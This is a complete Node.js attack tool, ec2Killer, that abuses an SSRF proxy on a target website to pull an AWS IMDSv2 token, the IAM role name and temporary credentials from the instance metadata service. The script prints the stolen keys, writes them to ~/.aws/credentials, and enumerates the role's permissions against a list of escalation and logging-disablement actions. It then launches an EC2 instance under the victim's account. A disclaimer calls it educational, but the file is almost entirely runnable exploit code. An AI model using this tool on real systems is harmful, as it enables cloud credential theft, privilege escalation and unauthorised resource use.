import fs from "fs";
import os from "os";
import path from "path";
import axios from "axios";
import { exec } from "child_process";
import util from "util";

const COLORS = {
  reset: "\x1b[0m",
  bright: "\x1b[1m",
  dim: "\x1b[2m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  blue: "\x1b[34m",
  magenta: "\x1b[35m",
  cyan: "\x1b[36m",
  white: "\x1b[37m",
};

const CONFIG = {
  imdsv2: {
    baseUrl: "http://169.254.169.254",
    endpoints: {
      token: "/latest/api/token",
      iamMetadata: "/latest/meta-data/iam/security-credentials",
    },
    headers: {
      tokenTTL: "x-aws-ec2-metadata-token-ttl-seconds",
      tokenRequest: "x-aws-ec2-metadata-token",
    },
  },
  aws: {
    defaultRegion: "il-central-1",
    credentialsPath: path.join(os.homedir(), ".aws", "credentials"),
  },
  ec2: {
    ami: "ami-006183c868a62af95",
    instanceType: "t3.micro",
    instanceCount: 1,
    instanceName: generateFunnyInstanceName(),
  },
};

function generateFunnyInstanceName() {
  const adjectives = [
    "Sneaky",
    "Stealthy",
    "Invisible",
    "Shadow",
    "Phantom",
    "Ghost",
    "Covert",
    "Rogue",
    "Ninja",
    "Silent",
  ];
  const nouns = [
    "Pineapple",
    "Potato",
    "Banana",
    "Cucumber",
    "Toaster",
    "Penguin",
    "Narwhal",
    "Llama",
    "Capybara",
    "Platypus",
  ];
  const numbers = Math.floor(Math.random() * 9000) + 1000;

  const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
  const noun = nouns[Math.floor(Math.random() * nouns.length)];

  return `${adj}${noun}${numbers}`;
}

const execPromise = util.promisify(exec);
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function log(message, data = null, color = null) {
  const timestamp = new Date().toISOString();
  const colorCode = color ? COLORS[color] : "";
  const reset = color ? COLORS.reset : "";
  console.log(
    `${COLORS.dim}[${timestamp}]${COLORS.reset} ${colorCode}${message}${reset}`
  );
  if (data) {
    console.log(data);
  }
}

function logSuccess(message) {
  log(message, null, "green");
}

function logError(message) {
  log(message, null, "red");
}

function logWarning(message) {
  log(message, null, "yellow");
}

function logInfo(message) {
  log(message, null, "cyan");
}

function logDanger(message) {
  log(message, null, "magenta");
}

function logSeparator() {
  console.log("-".repeat(80));
}

function displayBanner() {
  const banner = `
${COLORS.red}
    ███████╗ ██████╗██████╗     ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
    ██╔════╝██╔════╝╚════██╗    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
    █████╗  ██║      █████╔╝    █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
    ██╔══╝  ██║     ██╔═══╝     ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
    ███████╗╚██████╗███████╗    ██║  ██╗██║███████╗███████╗███████╗██║  ██║
    ╚══════╝ ╚═════╝╚══════╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
${COLORS.reset}
${COLORS.cyan}    ═══════════════════════════════════════════════════════════════════════${COLORS.reset}
${COLORS.yellow}                    AWS IMDSv2 Exploitation Tool${COLORS.reset}
${COLORS.dim}              Automated credential extraction and privilege analysis${COLORS.reset}
${COLORS.cyan}    ═══════════════════════════════════════════════════════════════════════${COLORS.reset}

${COLORS.magenta}    [+]${COLORS.reset} Extract IMDSv2 tokens through SSRF vulnerabilities
${COLORS.magenta}    [+]${COLORS.reset} Enumerate IAM role permissions and dangerous access
${COLORS.magenta}    [+]${COLORS.reset} Automatically test credentials with EC2 instance creation
${COLORS.magenta}    [+]${COLORS.reset} Detect privilege escalation vectors (PassRole, etc.)

${COLORS.cyan}    ═══════════════════════════════════════════════════════════════════════${COLORS.reset}
${COLORS.dim}                                v1.0.0 | @ec2Killer${COLORS.reset}
${COLORS.dim}     THIS TOOL IS INTENDED FOR EDUCATIONAL AND DEMONSTRATION PURPOSES ONLY${COLORS.reset}
${COLORS.cyan}    ═══════════════════════════════════════════════════════════════════════${COLORS.reset}
`;
  console.log(banner);
}

async function fetchIMDSv2Token(proxyUrl) {
  const tokenUrl = `${CONFIG.imdsv2.baseUrl}${CONFIG.imdsv2.endpoints.token}`;
  const fullUrl = `${proxyUrl}?url=${tokenUrl}`;

  try {
    const response = await axios.put(fullUrl, null, {
      headers: {
        [CONFIG.imdsv2.headers.tokenTTL]: 21600,
      },
    });
    return response.data;
  } catch (error) {
    logError("Failed to fetch IMDSv2 token");
    log(error.message, null, "red");
    throw error;
  }
}

async function fetchIAMRole(proxyUrl, token) {
  const metadataUrl = `${CONFIG.imdsv2.baseUrl}${CONFIG.imdsv2.endpoints.iamMetadata}`;
  const fullUrl = `${proxyUrl}?url=${metadataUrl}`;

  try {
    const response = await axios.get(fullUrl, {
      headers: {
        [CONFIG.imdsv2.headers.tokenRequest]: token,
      },
    });
    return response.data;
  } catch (error) {
    logError("Failed to fetch IAM role metadata");
    log(error.message, null, "red");
    throw error;
  }
}

async function fetchCredentials(proxyUrl, token, role) {
  const credentialsUrl = `${CONFIG.imdsv2.baseUrl}${CONFIG.imdsv2.endpoints.iamMetadata}/${role}`;
  const fullUrl = `${proxyUrl}?url=${credentialsUrl}`;

  try {
    const response = await axios.get(fullUrl, {
      headers: {
        [CONFIG.imdsv2.headers.tokenRequest]: token,
      },
    });
    return response.data;
  } catch (error) {
    logError("Failed to fetch security credentials");
    log(error.message, null, "red");
    throw error;
  }
}

function writeAWSCredentials(accessKeyId, secretKey, token, region) {
  const awsDir = path.dirname(CONFIG.aws.credentialsPath);
  const credentialsContent = `[default]
aws_access_key_id = ${accessKeyId}
aws_secret_access_key = ${secretKey}
aws_session_token = ${token}
region = ${region}
`;

  if (!fs.existsSync(awsDir)) {
    fs.mkdirSync(awsDir, { recursive: true });
  }

  fs.writeFileSync(CONFIG.aws.credentialsPath, credentialsContent, {
    encoding: "utf8",
    flag: "w",
  });

  logSuccess(
    `Credentials written successfully to ${CONFIG.aws.credentialsPath}`
  );
}

async function executeAWSCommand(command) {
  try {
    const { stdout } = await execPromise(command);
    return stdout.trim();
  } catch (error) {
    logError("AWS CLI command failed");
    log(error.message, null, "red");
    throw error;
  }
}

async function getFirstKeyPair() {
  return await executeAWSCommand(
    'aws ec2 describe-key-pairs --query "KeyPairs[0].KeyName" --output text'
  );
}

async function getFirstVPC() {
  return await executeAWSCommand(
    'aws ec2 describe-vpcs --query "Vpcs[0].VpcId" --output text'
  );
}

async function getFirstSubnet(vpcId) {
  return await executeAWSCommand(
    `aws ec2 describe-subnets --filters "Name=vpc-id,Values=${vpcId}" --query "Subnets[0].SubnetId" --output text`
  );
}

async function getFirstSecurityGroup(vpcId) {
  return await executeAWSCommand(
    `aws ec2 describe-security-groups --filters "Name=vpc-id,Values=${vpcId}" --query "SecurityGroups[0].GroupId" --output text`
  );
}

async function enumerateRolePermissions(roleName) {
  try {
    logInfo(`Enumerating all permissions for role: ${roleName}`);
    logSeparator();

    const allPermissions = new Set();
    const permissionsByService = {};
    const permissionSources = {};
    const dangerousPermissions = [];

    const dangerousPatterns = [
      { pattern: "iam:CreateUser", description: "Can create IAM users" },
      {
        pattern: "iam:CreateAccessKey",
        description: "Can create access keys for users",
      },
      {
        pattern: "iam:AttachUserPolicy",
        description: "Can attach policies to users",
      },
      {
        pattern: "iam:AttachRolePolicy",
        description: "Can attach policies to roles",
      },
      {
        pattern: "iam:PutUserPolicy",
        description: "Can add inline policies to users",
      },
      {
        pattern: "iam:PutRolePolicy",
        description: "Can add inline policies to roles",
      },
      { pattern: "iam:CreateRole", description: "Can create new IAM roles" },
      {
        pattern: "iam:UpdateAssumeRolePolicy",
        description: "Can modify trust policies",
      },
      {
        pattern: "sts:AssumeRole",
        description: "Can assume other roles (lateral movement)",
      },
      {
        pattern: "lambda:CreateFunction",
        description: "Can create Lambda functions",
      },
      {
        pattern: "lambda:UpdateFunctionCode",
        description: "Can modify Lambda code",
      },
      {
        pattern: "ec2:ModifyInstanceAttribute",
        description: "Can change instance IAM roles",
      },
      {
        pattern: "s3:PutBucketPolicy",
        description: "Can modify S3 bucket policies",
      },
      { pattern: "s3:GetObject", description: "Can read S3 objects" },
      { pattern: "s3:ListBucket", description: "Can list S3 buckets" },
      {
        pattern: "secretsmanager:GetSecretValue",
        description: "Can read secrets",
      },
      { pattern: "ssm:GetParameter", description: "Can read SSM parameters" },
      {
        pattern: "ssm:StartSession",
        description: "Can start SSM sessions (remote access)",
      },
      {
        pattern: "rds:CreateDBSnapshot",
        description: "Can snapshot databases",
      },
      {
        pattern: "ec2:CreateSnapshot",
        description: "Can snapshot EBS volumes",
      },
      {
        pattern: "ec2:ModifySecurityGroupRules",
        description: "Can modify security groups",
      },
      {
        pattern: "cloudtrail:StopLogging",
        description: "Can disable CloudTrail logging",
      },
      {
        pattern: "cloudtrail:DeleteTrail",
        description: "Can delete CloudTrail trails",
      },
      {
        pattern: "guardduty:DeleteDetector",
        description: "Can disable GuardDuty",
      },
    ];

    log("Checking attached managed policies...");
    const policiesCommand = `aws iam list-attached-role-policies --role-name ${roleName} --output json`;
    const policiesOutput = await executeAWSCommand(policiesCommand);
    const attachedPolicies = JSON.parse(policiesOutput);

    for (const policy of attachedPolicies.AttachedPolicies) {
      log(`  Analyzing policy: ${policy.PolicyName}`);

      const versionCommand = `aws iam get-policy --policy-arn ${policy.PolicyArn} --query "Policy.DefaultVersionId" --output text`;
      const versionId = await executeAWSCommand(versionCommand);

      const policyCommand = `aws iam get-policy-version --policy-arn ${policy.PolicyArn} --version-id ${versionId} --output json`;
      const policyOutput = await executeAWSCommand(policyCommand);
      const policyDocument = JSON.parse(policyOutput);

      extractPermissions(
        policyDocument.PolicyVersion.Document,
        allPermissions,
        permissionsByService,
        permissionSources,
        `Managed Policy: ${policy.PolicyName}`
      );
    }

    log("Checking inline policies...");
    const inlinePoliciesCommand = `aws iam list-role-policies --role-name ${roleName} --output json`;
    const inlinePoliciesOutput = await executeAWSCommand(inlinePoliciesCommand);
    const inlinePolicies = JSON.parse(inlinePoliciesOutput);

    for (const policyName of inlinePolicies.PolicyNames) {
      log(`  Analyzing inline policy: ${policyName}`);

      const inlineCommand = `aws iam get-role-policy --role-name ${roleName} --policy-name ${policyName} --output json`;
      const inlineOutput = await executeAWSCommand(inlineCommand);
      const inlinePolicy = JSON.parse(inlineOutput);

      extractPermissions(
        inlinePolicy.PolicyDocument,
        allPermissions,
        permissionsByService,
        permissionSources,
        `Inline Policy: ${policyName}`
      );
    }

    for (const permission of allPermissions) {
      for (const dangerous of dangerousPatterns) {
        if (matchesPermission(permission, dangerous.pattern)) {
          dangerousPermissions.push({
            permission: permission,
            description: dangerous.description,
            source: permissionSources[permission],
          });
        }
      }
    }

    logSeparator();
    log(`TOTAL PERMISSIONS FOUND: ${allPermissions.size}`, null, "bright");
    logSeparator();

    if (dangerousPermissions.length > 0) {
      logDanger("DANGEROUS PERMISSIONS DETECTED:");
      for (const dangerous of dangerousPermissions) {
        logDanger(`  [!] ${dangerous.permission}`);
        log(`      ${dangerous.description}`, null, "dim");
        log(`      Found in: ${dangerous.source}`, null, "dim");
      }
      logSeparator();
    }

    logInfo("POTENTIAL PERMISSIONS FROM IAM POLICIES, GROUPED BY SERVICE:");
    const sortedServices = Object.keys(permissionsByService).sort();
    for (const service of sortedServices) {
      const perms = permissionsByService[service];
      log(
        `  ${service.toUpperCase()}: ${perms.length} permissions`,
        null,
        "cyan"
      );
    }
    logSeparator();

    return {
      totalPermissions: allPermissions.size,
      dangerousPermissions: dangerousPermissions.length,
      hasDangerousPerms: dangerousPermissions.length > 0,
    };
  } catch (error) {
    logError("Failed to enumerate role permissions");
    log(error.message, null, "red");
    return null;
  }
}

function extractPermissions(
  policyDocument,
  allPermissions,
  permissionsByService,
  permissionSources,
  sourceName
) {
  const statements = Array.isArray(policyDocument.Statement)
    ? policyDocument.Statement
    : [policyDocument.Statement];

  for (const statement of statements) {
    if (statement.Effect === "Allow") {
      const actions = Array.isArray(statement.Action)
        ? statement.Action
        : [statement.Action];

      for (const action of actions) {
        allPermissions.add(action);

        if (!permissionSources[action]) {
          permissionSources[action] = sourceName;
        }

        const service = action.includes(":") ? action.split(":")[0] : "other";
        if (!permissionsByService[service]) {
          permissionsByService[service] = [];
        }
        permissionsByService[service].push(action);
      }
    }
  }
}

function matchesPermission(permission, pattern) {
  if (permission === "*" || permission === pattern) {
    return true;
  }

  const [permService, permAction] = permission.split(":");
  const [patternService, patternAction] = pattern.split(":");

  if (permService === patternService && permAction === "*") {
    return true;
  }

  const permRegex = new RegExp("^" + pattern.replace("*", ".*") + "$");
  return permRegex.test(permission);
}

async function checkPassRolePolicy(roleName) {
  try {
    logInfo(`Checking if role ${roleName} has PassRole policy...`);

    const policiesCommand = `aws iam list-attached-role-policies --role-name ${roleName} --output json`;
    const policiesOutput = await executeAWSCommand(policiesCommand);
    const attachedPolicies = JSON.parse(policiesOutput);

    let hasPassRole = false;

    for (const policy of attachedPolicies.AttachedPolicies) {
      const policyArn = policy.PolicyArn;
      log(`Checking policy: ${policy.PolicyName}`);

      const versionCommand = `aws iam get-policy --policy-arn ${policyArn} --query "Policy.DefaultVersionId" --output text`;
      const versionId = await executeAWSCommand(versionCommand);

      const policyCommand = `aws iam get-policy-version --policy-arn ${policyArn} --version-id ${versionId} --output json`;
      const policyOutput = await executeAWSCommand(policyCommand);
      const policyDocument = JSON.parse(policyOutput);

      const statements = policyDocument.PolicyVersion.Document.Statement;

      for (const statement of statements) {
        if (statement.Effect === "Allow") {
          const actions = Array.isArray(statement.Action)
            ? statement.Action
            : [statement.Action];

          if (
            actions.some(
              (action) =>
                action === "iam:PassRole" ||
                action === "iam:*" ||
                action === "*"
            )
          ) {
            hasPassRole = true;
            logSuccess(
              `Found PassRole permission in policy: ${policy.PolicyName}`
            );
            break;
          }
        }
      }

      if (hasPassRole) break;
    }

    const inlinePoliciesCommand = `aws iam list-role-policies --role-name ${roleName} --output json`;
    const inlinePoliciesOutput = await executeAWSCommand(inlinePoliciesCommand);
    const inlinePolicies = JSON.parse(inlinePoliciesOutput);

    if (!hasPassRole && inlinePolicies.PolicyNames.length > 0) {
      for (const policyName of inlinePolicies.PolicyNames) {
        log(`Checking inline policy: ${policyName}`);

        const inlineCommand = `aws iam get-role-policy --role-name ${roleName} --policy-name ${policyName} --output json`;
        const inlineOutput = await executeAWSCommand(inlineCommand);
        const inlinePolicy = JSON.parse(inlineOutput);

        const statements = inlinePolicy.PolicyDocument.Statement;

        for (const statement of statements) {
          if (statement.Effect === "Allow") {
            const actions = Array.isArray(statement.Action)
              ? statement.Action
              : [statement.Action];

            if (
              actions.some(
                (action) =>
                  action === "iam:PassRole" ||
                  action === "iam:*" ||
                  action === "*"
              )
            ) {
              hasPassRole = true;
              logSuccess(
                `Found PassRole permission in inline policy: ${policyName}`
              );
              break;
            }
          }
        }

        if (hasPassRole) break;
      }
    }

    logSeparator();
    if (hasPassRole) {
      logSuccess("CONFIRMED: Role has iam:PassRole permission");
    } else {
      logWarning("WARNING: Role does NOT have iam:PassRole permission");
    }
    logSeparator();

    return hasPassRole;
  } catch (error) {
    logError("Failed to check PassRole policy");
    log(error.message, null, "red");
    return false;
  }
}

async function launchEC2Instance() {
  try {
    logInfo("Gathering EC2 prerequisites...");

    const keyPair = await getFirstKeyPair();
    log(`Using key pair: ${keyPair}`);

    const vpcId = await getFirstVPC();
    log(`Using VPC: ${vpcId}`);

    const subnetId = await getFirstSubnet(vpcId);
    log(`Using subnet: ${subnetId}`);

    const securityGroupId = await getFirstSecurityGroup(vpcId);
    log(`Using security group: ${securityGroupId}`);

    logSeparator();

    const command = `aws ec2 run-instances \
--image-id ${CONFIG.ec2.ami} \
--count ${CONFIG.ec2.instanceCount} \
--instance-type ${CONFIG.ec2.instanceType} \
--key-name ${keyPair} \
--security-group-ids ${securityGroupId} \
--subnet-id ${subnetId} \
--tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=${CONFIG.ec2.instanceName}}]' \
--output json`;

    logInfo("Launching EC2 instance...");

    const { stdout } = await execPromise(command);
    const result = JSON.parse(stdout);

    const instance = result.Instances[0];
    const instanceId = instance.InstanceId;
    const state = instance.State.Name;
    const instanceType = instance.InstanceType;
    const az = instance.Placement.AvailabilityZone;

    logSuccess("EC2 instance created successfully:");
    log(`  Instance ID: ${instanceId}`, null, "green");
    log(`  State: ${state}`, null, "green");
    log(`  Type: ${instanceType}`, null, "green");
    log(`  Availability Zone: ${az}`, null, "green");
    log(`  Name: ${CONFIG.ec2.instanceName}`, null, "green");
    logSeparator();
  } catch (error) {
    logError("Failed to launch EC2 instance");
    log(error.message, null, "red");
    throw error;
  }
}

async function main() {
  const proxyUrl = process.argv[2];

  displayBanner();

  if (!proxyUrl) {
    logError("Missing required argument: proxy URL");
    console.log(
      `${COLORS.yellow}Usage: node ec2Killer.js <proxy-url>${COLORS.reset}`
    );
    console.log(
      `${COLORS.dim}Example: node ec2Killer.js http://vulnerable-site.com/proxy${COLORS.reset}\n`
    );
    process.exit(1);
  }

  try {
    await sleep(1500);
    logInfo(`Extracting IMDSv2 token via proxy: ${proxyUrl}`);

    const token = await fetchIMDSv2Token(proxyUrl);

    if (!token) {
      throw new Error("No token received from IMDSv2");
    }

    await sleep(1700);
    logInfo(
      `Extracting security role from ${CONFIG.imdsv2.endpoints.iamMetadata}`
    );

    const iamRole = await fetchIAMRole(proxyUrl, token);

    await sleep(2200);
    logSuccess(`Found IAM role: ${iamRole}`);
    logSeparator();

    await sleep(1900);
    logInfo(`Extracting credentials for role: ${iamRole}`);

    const credentials = await fetchCredentials(proxyUrl, token, iamRole);

    await sleep(1300);
    log("SUCCESSFULLY RETRIEVED CREDENTIALS:", null, "red");
    log(`Access Key ID: ${credentials.AccessKeyId}`, null, "green");
    log(`Secret Access Key: ${credentials.SecretAccessKey}`, null, "green");
    log(
      `Session Token: ${credentials.Token.substring(0, 50)}...`,
      null,
      "green"
    );

    logSeparator();

    await sleep(1400);
    logInfo("Writing AWS CLI credentials to ~/.aws/credentials...");

    await sleep(1400);
    writeAWSCredentials(
      credentials.AccessKeyId,
      credentials.SecretAccessKey,
      credentials.Token,
      CONFIG.aws.defaultRegion
    );

    logSeparator();

    await sleep(1000);
    logInfo("Enumerating role permissions...");
    await sleep(500);
    const permissionResults = await enumerateRolePermissions(iamRole);

    await sleep(800);
    await checkPassRolePolicy(iamRole);

    await sleep(800);
    logInfo("Testing credentials by launching EC2 instance...");
    await sleep(700);
    logInfo("Executing EC2 instance...");
    await launchEC2Instance();
  } catch (error) {
    logError("Fatal error occurred");
    log(error.message, null, "red");
    process.exit(1);
  }
}

main();
